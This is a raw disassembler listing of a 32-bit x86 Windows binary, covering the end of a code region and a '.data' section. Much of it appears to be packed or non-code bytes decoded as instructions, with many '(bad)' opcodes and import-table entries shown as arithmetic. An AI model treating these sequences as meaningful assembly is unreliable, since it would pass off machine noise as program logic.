  41cc1a:	inc    esp
  41cc1b:	dec    esp
  41cc1c:	inc    ebp
  41cc1d:	sti    
  41cc1e:	test   eax,0x519ddfb8
  41cc23:	out    dx,eax
  41cc24:	pop    eax
  41cc25:	imul   eax,DWORD PTR [ebx],0x78
  41cc28:	or     al,dl
  41cc2a:	mov    esi,0xe76eb266
  41cc2f:	(bad)  
  41cc30:	jmp    FWORD PTR [eax+0x10]
  41cc33:	repz (bad) 
  41cc36:	mov    ebx,0x785e8898
  41cc3b:	fs ss sub al,0xfb
  41cc3f:	mov    edx,0xf2641dab
  41cc44:	push   esp
  41cc45:	xlat   BYTE PTR ds:[ebx]
  41cc46:	mov    eax,ds:0x688c3b89
  41cc4b:	jno    0x41cc60
  41cc4d:	inc    ecx
  41cc4e:	xchg   DWORD PTR ds:0x9177ceb5,edi
  41cc54:	sub    eax,0x81934a9b
  41cc59:	inc    ecx
  41cc5a:	push   ebp
  41cc5b:	das    
  41cc5c:	pop    es
  41cc5d:	mov    ah,0x57
  41cc5f:	dec    ebx
  41cc60:	repz xchg esp,eax
  41cc62:	mov    ecx,0x6ac031a7
  41cc67:	jne    0x41cce4
  41cc69:	in     al,dx
  41cc6a:	push   ebx
  41cc6b:	mov    eax,0x8d96348c
  41cc70:	or     cl,BYTE PTR [esi+0x3ac9d165]
  41cc76:	test   bl,al
  41cc78:	lea    esi,[ebp+0x45]
  41cc7b:	scas   eax,DWORD PTR es:[edi]
  41cc7c:	ret    
  41cc7d:	je     0x41cccf
  41cc7f:	loope  0x41cce9
  41cc81:	pop    eax
  41cc82:	lods   al,BYTE PTR ds:[esi]
  41cc83:	out    0x89,eax
  41cc85:	inc    ecx
  41cc86:	cs push ds
  41cc88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc89:	mov    ds:0xb68a2a16,eax
  41cc8e:	xor    bl,ch
  41cc90:	add    DWORD PTR [eax-0x53fd1d58],0x56eb96e7
  41cc9a:	pop    eax
  41cc9b:	ror    BYTE PTR [edx+0x55],cl
  41cc9e:	fldl2t 
  41cca0:	inc    ecx
  41cca1:	ins    DWORD PTR es:[edi],dx
  41cca2:	lea    eax,[ebx]
  41cca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cca5:	clc    
  41cca6:	inc    eax
  41cca7:	adc    ch,bh
  41cca9:	adc    eax,0xa569c38a
  41ccae:	sbb    al,0x13
  41ccb0:	loop   0x41cc44
  41ccb2:	inc    ebx
  41ccb3:	xlat   BYTE PTR ds:[ebx]
  41ccb4:	es (bad) 
  41ccb6:	scas   al,BYTE PTR es:[edi]
  41ccb7:	inc    ebp
  41ccb8:	enter  0x4234,0x1e
  41ccbc:	mov    edi,esi
  41ccbe:	sti    
  41ccbf:	sahf   
  41ccc0:	stc    
  41ccc1:	inc    edx
  41ccc2:	in     al,0x21
  41ccc4:	js     0x41cd11
  41ccc6:	push   ebx
  41ccc7:	dec    ebp
  41ccc8:	sub    DWORD PTR [ecx],eax
  41ccca:	add    al,0x9c
  41cccc:	sti    
  41cccd:	xor    ebx,ecx
  41cccf:	imul   ebp,DWORD PTR [eax-0x65],0xffffff98
  41ccd3:	push   cs
  41ccd4:	loopne 0x41cc8c
  41ccd6:	stos   BYTE PTR es:[edi],al
  41ccd7:	push   edi
  41ccd8:	(bad)  
  41ccd9:	rcr    DWORD PTR [edx+0x596dba15],cl
  41ccdf:	in     al,0xca
  41cce1:	das    
  41cce2:	mov    gs,WORD PTR [edi+ebp*2]
  41cce5:	xchg   ecx,eax
  41cce6:	xchg   esi,eax
  41cce7:	std    
  41cce8:	call   0xbc015f2c
  41cced:	sub    BYTE PTR [eax+0x7400ab73],ch
  41ccf3:	aam    0x81
  41ccf5:	(bad)  
  41ccf6:	cmc    
  41ccf7:	pop    esi
  41ccf8:	inc    esi
  41ccf9:	xchg   edi,eax
  41ccfa:	addr16 pop esi
  41ccfc:	imul   esp,esi,0x4e
  41ccff:	dec    edx
  41cd00:	xor    eax,0x85c91ce3
  41cd05:	jle    0x41cd57
  41cd07:	test   ebp,ebp
  41cd09:	or     DWORD PTR [edx],ecx
  41cd0b:	lahf   
  41cd0c:	push   ecx
  41cd0d:	pushf  
  41cd0e:	aam    0x35
  41cd10:	rol    DWORD PTR [ebp-0x4e],1
  41cd13:	dec    eax
  41cd14:	push   ds
  41cd15:	sbb    esp,DWORD PTR [ecx+0x6b30ad4f]
  41cd1b:	cmp    al,0xbe
  41cd1d:	and    DWORD PTR [ebx+0x8],edi
  41cd20:	mov    edx,0x52d5b826
  41cd25:	dec    ecx
  41cd26:	adc    BYTE PTR [esi],ah
  41cd28:	xchg   ebx,eax
  41cd29:	lahf   
  41cd2a:	pop    edx
  41cd2b:	in     eax,dx
  41cd2c:	xor    al,0x72
  41cd2e:	pop    edx
  41cd2f:	leave  
  41cd30:	fucomi st,st(4)
  41cd32:	retf   
  41cd33:	(bad)  
  41cd34:	in     eax,dx
  41cd35:	or     edx,esp
  41cd37:	in     al,0x1a
  41cd39:	lods   al,BYTE PTR ds:[esi]
  41cd3a:	sbb    al,0x30
  41cd3c:	add    DWORD PTR [eax-0x7f],ecx
  41cd3f:	xchg   edi,eax
  41cd40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd41:	test   eax,0x81a01db7
  41cd46:	and    eax,0x38c32c83
  41cd4b:	fiadd  DWORD PTR [eax+0x64]
  41cd4e:	xchg   ebx,eax
  41cd4f:	cld    
  41cd50:	jo     0x41cd2e
  41cd52:	pop    edi
  41cd53:	or     ecx,DWORD PTR [ebx+0x13]
  41cd56:	jae    0x41cdb9
  41cd58:	mov    dh,0x1d
  41cd5a:	leave  
  41cd5b:	or     BYTE PTR [ebp+eax*8-0x5e],al
  41cd5f:	xchg   edx,eax
  41cd60:	fsub   QWORD PTR [eax+0xb]
  41cd63:	lods   al,BYTE PTR ds:[esi]
  41cd64:	in     al,dx
  41cd65:	test   edx,ecx
  41cd67:	sbb    BYTE PTR [ebp+0x5b],bh
  41cd6a:	leave  
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
